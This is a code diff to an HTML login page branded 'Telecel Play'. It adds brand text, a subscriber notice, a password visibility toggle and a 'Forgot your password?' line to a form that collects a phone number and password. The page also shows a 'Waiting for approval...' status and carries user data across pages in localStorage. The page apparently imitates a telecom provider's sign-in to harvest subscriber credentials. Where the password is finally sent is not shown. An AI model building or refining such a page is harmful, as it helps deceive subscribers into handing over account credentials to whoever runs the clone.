@@ -13,8 +13,8 @@
       color: #ffffff;
       min-height: 100vh;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
     }
 
     .container {
@@ -24,9 +24,9 @@
     }
 
     /* LOGO */
-    .logo-wrap {
+    .logo {
       text-align: center;
-      margin-bottom: 28px;
+      margin-bottom: 24px;
     }
 
     .logo-circle {
@@ -37,23 +37,30 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 10px;
-      font-size: 36px;
+      margin: 0 auto 8px;
+      font-size: 34px;
       font-weight: bold;
-      color: #ffffff;
-      font-family: Arial, Helvetica, sans-serif;
     }
 
-    .logo-wrap h1 {
-      margin: 0;
+    .telecel {
       font-size: 22px;
+      font-weight: bold;
       color: #e53935;
+      margin-bottom: 6px;
     }
 
-    .logo-wrap p {
-      margin-top: 6px;
-      font-size: 14px;
+    .welcome {
+      font-size: 16px;
+      font-weight: bold;
+      color: #e53935;
+      margin-bottom: 6px;
+    }
+
+    .desc {
+      font-size: 13px;
       color: #bdbdbd;
+      line-height: 1.4;
+      margin-bottom: 22px;
     }
 
     label {
@@ -74,6 +81,7 @@
       background: #1b1b1b;
       color: #ffffff;
       outline: none;
+      box-sizing: border-box;
     }
 
     select {
@@ -84,6 +92,28 @@
       background-size: 12px;
     }
 
+    .password-wrap {
+      position: relative;
+    }
+
+    .eye {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #aaa;
+      font-size: 16px;
+    }
+
+    .forgot {
+      text-align: right;
+      font-size: 12px;
+      color: #e53935;
+      margin-top: -10px;
+      margin-bottom: 16px;
+    }
+
     button {
       width: 100%;
       padding: 16px;
@@ -92,22 +122,21 @@
       cursor: pointer;
     }
 
-    .primary-btn {
+    .primary {
       background: #e53935;
-      color: #ffffff;
       border: none;
-      margin-top: 6px;
+      color: #ffffff;
+      margin-bottom: 12px;
     }
 
-    .secondary-btn {
+    .secondary {
       background: transparent;
       border: 1px solid #e53935;
       color: #e53935;
-      margin-top: 12px;
     }
 
     .status {
-      margin-top: 18px;
+      margin-top: 16px;
       text-align: center;
       font-size: 14px;
       color: #4caf50;
@@ -119,8 +148,8 @@
     }
 
     .footer {
-      text-align: center;
       margin-top: 28px;
+      text-align: center;
       font-size: 12px;
       color: #777;
     }
@@ -130,17 +159,20 @@
 
   <div class="container">
 
-    <!-- LOGO + TITLE -->
-    <div class="logo-wrap">
+    <!-- HEADER -->
+    <div class="logo">
       <div class="logo-circle">t</div>
-      <h1>Welcome</h1>
-      <p>Enter your number to sign up or log in.</p>
+      <div class="telecel">telecel</div>
+      <div class="welcome">Welcome to Telecel Play</div>
+      <div class="desc">
+        Enter your number to sign up or log in.<br>
+        You need to be a Telecel subscriber to proceed.
+      </div>
     </div>
 
     <!-- FORM -->
     <form id="detailsForm">
 
-      <!-- ACCOUNT TYPE (UI ONLY) -->
       <label>Account type</label>
       <select>
         <option>Mobile</option>
@@ -151,22 +183,28 @@
       <input type="text" id="phone" required />
 
       <label>Password</label>
-      <input type="password" id="password" required />
+      <div class="password-wrap">
+        <input type="password" id="password" required />
+        <span class="eye" onclick="togglePassword()">👁</span>
+      </div>
 
-      <button type="submit" class="primary-btn">Next</button>
+      <div class="forgot">Forgot your password?</div>
+
+      <button type="submit" class="primary">Next</button>
     </form>
 
     <div id="status" class="status">⏳ Waiting for approval...</div>
 
-    <button class="secondary-btn" onclick="history.back()">Go Back</button>
+    <button class="secondary" onclick="history.back()">Go Back</button>
 
     <div class="footer">v 5.3.2 (1.0.0)</div>
   </div>
 
-  <!-- LOGIC UNCHANGED -->
+  <!-- LOGIC (UNCHANGED) -->
   <script>
     const form = document.getElementById('detailsForm');
     const statusEl = document.getElementById('status');
+    const passwordInput = document.getElementById('password');
 
     const fullName = localStorage.getItem('fullName');
 
@@ -183,11 +221,16 @@
       window.location.href = 'index.html';
     }
 
+    function togglePassword() {
+      passwordInput.type =
+        passwordInput.type === 'password' ? 'text' : 'password';
+    }
+
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       const phone = document.getElementById('phone').value;
-      const password = document.getElementById('password').value;
+      const password = passwordInput.value;
 
       localStorage.setItem('phone', phone);
 
